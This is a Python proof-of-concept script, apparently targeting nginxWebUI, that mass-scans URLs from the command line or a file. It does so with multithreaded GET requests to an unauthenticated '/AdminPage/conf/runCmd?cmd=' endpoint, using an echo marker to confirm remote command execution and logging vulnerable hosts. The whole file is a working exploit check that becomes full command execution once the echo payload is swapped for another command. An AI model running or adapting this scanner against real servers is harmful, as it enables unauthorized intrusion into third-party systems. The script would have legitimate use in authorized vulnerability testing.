import requests
import urllib3
import urllib
import hashlib
import argparse
import logging
import threading
from colorama import init
from colorama import Fore

init(autoreset=True)
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
}

# logging.basicConfig(filename='result.log', level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logging.basicConfig(filename='result.log',encoding='utf-8', level=logging.INFO, format='%(message)s')





def poc(url):
    if url.endswith("/"):
        path = r"AdminPage/conf/runCmd?cmd=echo%20nginxQWFAHFJKWHAFLWJALfAHFJWAKH%26%26echo%20nginx"
    else:
        path = r"/AdminPage/conf/runCmd?cmd=echo%20nginxQWFAHFJKWHAFLWJALfAHFJWAKH%26%26echo%20nginx"
    pocurl = url + path
    # data = {
    #     "service": urllib.parse.quote(url + "/home/index.action")
    # }
    try:
        response = requests.get(url=pocurl, headers=head, verify=False, timeout=10)
        if response.status_code == 200:
            if "nginxQWFAHFJKWHAFLWJALfAHFJWAKH" in response.text:
                print(Fore.GREEN + f"[+]{url}RCE漏洞！！！！")
                logging.info(f"{url}")
        else:
            print(Fore.RED + f"[-]{url}RCE漏洞")
            # logging.info(f"[-]{url}RCE漏洞")
    except:
        pass


def poc_thread(urls):
    for url in urls:
        poc(url)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 nginxwebui.py -u http://xxxx\npython3 nginxwebui.py -f file.txt',
                                     description='nginxwebui poc',
                                     )
    p = parser.add_argument_group('nginxwebui 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    p.add_argument("-t", "--threads", type=int, default=10, help="线程数，默认为 10")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    if args.file:
        urls = open(args.file, "r").read().split("\n")
        threads = args.threads
        urls_per_thread = len(urls) // threads
        thread_list = []
        for i in range(threads):
            if i == threads - 1:
                urls_for_thread = urls[i * urls_per_thread:]
            else:
                urls_for_thread = urls[i * urls_per_thread: (i + 1) * urls_per_thread]
            t = threading.Thread(target=poc_thread, args=(urls_for_thread,))
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()
